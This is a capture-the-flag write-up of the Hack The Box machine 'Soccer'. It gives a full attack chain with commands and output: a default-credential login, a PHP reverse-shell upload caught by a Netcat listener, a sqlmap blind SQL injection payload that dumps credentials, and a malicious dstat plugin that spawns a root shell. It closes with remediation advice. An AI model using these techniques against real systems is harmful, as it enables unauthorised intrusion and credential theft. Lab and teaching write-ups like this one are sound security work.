---
layout: post
title: Hack The Box Walkthrough - Soccer
date: 2023-06-10
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2023/06/HTB/Soccer
img: 2023/06/Soccer/Soccer.png
---

This was an easy machine where I exploited LFI, SQL Injection, and some insecure configurations.

* Room: Soccer
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Soccer](https://app.hackthebox.com/machines/Soccer)
* Author: [sau123](https://app.hackthebox.com/users/201596)

## Enumeration

As always, I started the machine by checking for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.194:22
Open 10.10.11.194:80
Open 10.10.11.194:9091
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

...
Scanned at 2023-01-24 18:25:42 EST for 19s

PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8
m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNA
G2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=
|   256 5797565def793c2fcbdb35fff17c615c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
80/tcp   open  http            syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
9091/tcp open  xmltec-xmlmail? syn-ack
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Tue, 24 Jan 2023 23:25:56 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
...
Nmap done: 1 IP address (1 host up) scanned in 18.97 seconds
```

There were three open ports. 
* 22 - SSH
* 80 - HTTP
* 9091 - Looked like an HTTP server

The web server on port 80 was redirecting to 'http://soccer.htb/' so I added that to my hosts file and scanned for hidden pages.

```bash
$ feroxbuster -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soccer.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      147l      526w     6917c http://soccer.htb/
403      GET        7l       10w      162c http://soccer.htb/.html
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
200      GET       96l     1750w        0c http://soccer.htb/tiny/
...
[####################] - 57s   189264/189264  0s      found:125     errors:0
[####################] - 48s    63088/63088   1312/s  http://soccer.htb/
[####################] - 49s    63088/63088   1280/s  http://soccer.htb/tiny/
[####################] - 49s    63088/63088   1286/s  http://soccer.htb/tiny/uploads/
```

## Local File Inclusion (LFI)

I opened a browser and looked at the website on port 80.

![Main Site](/assets/images/2023/06/Soccer/HTBFootballClub.png "Main Site")

It took me to what looked like a static site. FeroxBuster had found something on '/tiny', so I looked at that.

![Tiny File Manager](/assets/images/2023/06/Soccer/TinyFileManager.png "Tiny File Manager")

It contained an instance of [Tiny File Manager](https://tinyfilemanager.github.io/). I immediately thought about LFI. But I needed to log in first. I tried basic SQL Injection and some simple credentials. But that failed. 

I looked for default credentials and found them in the [documentation](https://tinyfilemanager.github.io/docs/#line3).

```
* Admin user: admin/admin@123
* Normal user: user/12345
```

I tried the admin credentials, and they worked. 

![Logged In](/assets/images/2023/06/Soccer/LoggedIn.png "Logged In")

The application allowed uploading files. My first attempts were rejected because I could not write to the webroot. I looked in the '/tiny' folder and saw an '/upload' folder. I tried to upload a PHP file there.

![Uploaded File](/assets/images/2023/06/Soccer/UploadedFile.png "Uploaded File")

Once the file was uploaded, I clicked on the 'Open' link to view the file. It opened and printed only 'IN', which confirmed that the code was executed.

I uploaded a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell), started a Netcat listener, and opened the uploaded file.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.194] 52404
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 23:51:48 up 11:57,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data
```

I was on the server.

## SQL Injection

Once on the server, I started looking around. There was a user called 'player', but I could not read their home folder.

I looked for some time without finding anything. Then I went to the nginx configuration and found a second website.

```bash
www-data@soccer:~/html$ cat /etc/nginx/sites-enabled/soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```

I added 'soc-player.soccer.htb' to my hosts file and loaded that site.

![Soccer Player Site](/assets/images/2023/06/Soccer/SocPlayerSite.png "Soccer Player Site")

It was the same site as before, with some additional menu options. The Match tab showed some upcoming games. I create an account and logged in the website.

Once connected, I was taken to a page where I was given a ticket ID, and I could check for other tickets.

![My Ticket](/assets/images/2023/06/Soccer/MyTicket.png "My Ticket")

The page was making a websocket request to port 9091 to check if the ticket existed or not. 

I tried SQL Injection, and it worked. 

![SQL Injection](/assets/images/2023/06/Soccer/WebSocketSQLi.png "SQL Injection")

I was about to write a script to extract the data, but I decided to check if sqlmap could exploit websockets. 

```bash
$ sqlmap -u "ws://soc-player.soccer.htb:9091" --data='{"id":"123*"}'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not re
sponsible for any misuse or damage caused by this program

[*] starting @ 19:16:51 /2023-01-25/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q]
JSON data found in POST body. Do you want to process it? [Y/n/q]
[19:16:53] [INFO] testing connection to the target URL
[19:16:56] [INFO] testing if the target URL content is stable
[19:16:56] [INFO] target URL content is stable
[19:16:56] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
[19:16:56] [WARNING] (custom) POST parameter 'JSON #1*' does not appear to be dynamic
[19:16:57] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
[19:16:57] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
[19:16:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:16:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:16:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:16:58] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:16:59] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:16:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:17:00] [INFO] testing 'Generic inline queries'
[19:17:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:17:00] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:17:01] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:17:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:17:12] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
[19:17:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:17:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:17:27] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]
[19:17:34] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[19:17:34] [INFO] checking if the injection point on (custom) POST parameter 'JSON #1*' is a false positive
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 96 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"123 AND (SELECT 3483 FROM (SELECT(SLEEP(5)))LsCb)"}
---
[19:17:53] [INFO] the back-end DBMS is MySQL
[19:17:53] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
back-end DBMS: MySQL >= 5.0.12
[19:17:54] [INFO] fetched data logged to text files under '/home/ehogue/.local/share/sqlmap/output/soc-player.soccer.htb'

[*] ending @ 19:17:54 /2023-01-25/
```

It was doing blind injection which is slow. But still quicker than writing a script. I extracted the database schema.

```bash
$ sqlmap -u "ws://soc-player.soccer.htb:9091" --data='{"id":"123*"}' --schema
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:20:10 /2023-01-25/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q]
JSON data found in POST body. Do you want to process it? [Y/n/q]
[19:20:13] [INFO] resuming back-end DBMS 'mysql'
[19:20:13] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"123 AND (SELECT 3483 FROM (SELECT(SLEEP(5)))LsCb)"}
---
...
[19:20:28] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
5
[19:20:59] [INFO] retrieved: information_schema
[19:22:16] [INFO] retrieved: performance_schema
[19:24:13] [INFO] retrieved: sys
[19:24:37] [INFO] retrieved: soccer_db
[19:25:45] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, soccer_db, sys'
[19:25:45] [INFO] fetching number of tables for database 'soccer_db'
[19:25:45] [INFO] retrieved: 1
[19:25:48] [INFO] retrieved: accounts
...
```
And lastly, I asked it to dump the accounts table in the soccer database.

```bash
$ sqlmap -u "ws://soc-player.soccer.htb:9091" --data='{"id":"123*"}' -D soccer_db -T accounts --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:30:02 /2023-01-25/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q]
JSON data found in POST body. Do you want to process it? [Y/n/q]
[19:30:04] [INFO] resuming back-end DBMS 'mysql'
[19:30:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"123 AND (SELECT 3483 FROM (SELECT(SLEEP(5)))LsCb)"}
---
...
[19:30:21] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
4
[19:30:21] [INFO] retrieved: id
[19:30:38] [INFO] retrieved: email
[19:30:56] [INFO] retrieved: username
[19:31:27] [INFO] retrieved: password
[19:32:02] [INFO] fetching entries for table 'accounts' in database 'soccer_db'
[19:32:02] [INFO] fetching number of entries for table 'accounts' in database 'soccer_db'
[19:32:02] [INFO] retrieved: 1
[19:32:04] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
player@player.htb
[19:33:22] [INFO] retrieved: 1324
[19:33:38] [INFO] retrieved: REDACTED
[19:34:58] [INFO] retrieved: player
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | REDACTED             | player   |
+------+-------------------+----------------------+----------+

[19:35:24] [INFO] table 'soccer_db.accounts' dumped to CSV file '/home/ehogue/.local/share/sqlmap/output/soc-player.soccer.htb/dump/soccer_db/accounts.csv'
[19:35:24] [INFO] fetched data logged to text files under '/home/ehogue/.local/share/sqlmap/output/soc-player.soccer.htb'

[*] ending @ 19:35:24 /2023-01-25/
```

I connected to the server with the extracted credentials.

```bash
$ ssh player@target
The authenticity of host 'target (10.10.11.194)' can't be established.
ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
player@target's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jan 26 00:36:23 UTC 2023

  System load:           0.0
  Usage of /:            72.1% of 3.84GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.194
  IPv6 address for eth0: dead:beef::250:56ff:feb9:2185

...

Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19
player@soccer:~$ ls
user.txt

player@soccer:~$ cat user.txt
REDACTED
```

## Exploiting dstat

Once connected as player, I started looking at ways to get root. I looked around the server, checking for sudo, suid, binaries, cronjobs, running programs, ... I did not find anything that would help me elevate my privileges.

I downloaded [LinPEAS](https://github.com/carlospolop/PEASS-ng) on the server and ran it.

```bash
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

I could use [doas](https://wiki.archlinux.org/title/Doas) to run [dstat](https://linux.die.net/man/1/dstat) as root. 

```bash
player@soccer:~$ cat /usr/local/etc/doas.conf 
permit nopass player as root cmd /usr/bin/dstat

player@soccer:~$ doas -u root /usr/bin/dstat
You did not select any stats, using -cdngy by default.
--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--
usr sys idl wai stl| read  writ| recv  send|  in   out | int   csw 
  3   3  92   2   0|2360k  279k|   0     0 |   0     0 | 488   951 
  1   0  99   0   0|   0     0 | 572B 1198B|   0     0 |1946  5911 
  0   0 100   0   0|   0     0 | 192B  478B|   0     0 | 271   591 
  0   0  99   0   0|   0    56k| 132B  436B|   0     0 | 255   487 
  1   0  99   0   0|   0     0 | 132B  444B|   0     0 | 255   484 
  0   0 100   0   0|   0     0 | 132B  436B|   0     0 | 237   461 
```

I looked at dstat to see if it could be used to run some code. I could list a bunch of plugins, but the folder containing them was not writable. 

```bash
player@soccer:~$ doas -u root /usr/bin/dstat --list
internal:
        aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,page24,proc,raw,socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones
/usr/share/dstat:
        battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,dstat-cpu,dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs,gpfs-ops,helloworld,ib,
        innodb-buffer,innodb-io,innodb-ops,jvm-full,jvm-vm,lustre,md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats,mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,
        mysql5-innodb,mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,net-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops,nfsstat4,ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,sendmail,
        snmp-cpu,snmp-load,snmp-mem,snmp-net,snmp-net-err,snmp-sys,snooze,squid,test,thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime,top-cputime-avg,top-int,top-io,top-io-adv,top-latency,
        top-latency-avg,top-mem,top-oom,utmp,vm-cpu,vm-mem,vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,zfs-zil

player@soccer:~$ ls -ld /usr/share/dstat/
drwxr-xr-x 3 root root 4096 Nov 17 09:09 /usr/share/dstat/
```

I check [GTFOBins](https://gtfobins.github.io/) for known exploits but did not find one there. I search for one and [found something](https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/#dstat). dstat also read plugins from `/usr/local/share/dstat/`, and I could write there. 

```bash
player@soccer:~$ ls -ld /usr/local/share/dstat/
drwxrwx--- 2 root player 4096 Dec 12 14:53 /usr/local/share/dstat/
```

I created a plugin file in that directory and ran it in dstat to get root.

```bash
player@soccer:~$ cat /usr/local/share/dstat/dstat_exploit.py
import os
os.system('/usr/bin/bash -p')

player@soccer:~$ doas -u root /usr/bin/dstat --exploit
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp

root@soccer:/home/player# whoami
root

root@soccer:/home/player# cat /root/root.txt 
REDACTED
```

## Securing The Box

The first issues I found on the box were with [Tiny File Manager](https://github.com/prasathmani/tinyfilemanager). The site used the default credentials. They should have been changed before putting the app online. The code should probably not have default credentials at all. People will forget and end up with insecure sites. It would be better to force users to set their own passwords.

The site allows uploading any type of file and putting them in the web root. This is a perfect recipe to get RCE. The code allows setting an allowed list of extensions, but that is not used on this box. This list should be set to a very limited list of accepted extensions. 

And the uploaded files should not be placed in the web root. Tiny allows changing where the files are stored, but the default value and the examples are using the web root.

Next, the ticket page of the application takes user input and appends it directly to an SQL query. The code should use [prepared statements](https://en.wikipedia.org/wiki/Prepared_statement). There are no reasons not to use them.

```js
(async () => {
    try {
      const query = `Select id,username,password  FROM accounts where id = ${id}`;
      await connection.query(query, function (error, results, fields) { 
        if (error) { 
            ws.send("Ticket Doesn't Exist"); 
        } else { 
            if (results.length > 0) { 
                  ws.send("Ticket Exists") 
            } else { 
                  ws.send("Ticket Doesn't Exist") 
            } 
        } 
      }); 
    } catch (error) { 
      ws.send("Error"); 
    } 
})() 
```

The box also has problems with passwords. First, player's password is stored in clear in the database. It should have been hashed. The password is also reused. The same password is used in the application, and for the user on the server.

Finally, there were issues with dstat. All the folders where the application reads plugins should be protected. Users should not be able to add or change files in them. And did a user really need to run this application as root? They should be able to monitor their processes, but not the processes of everyone on the box.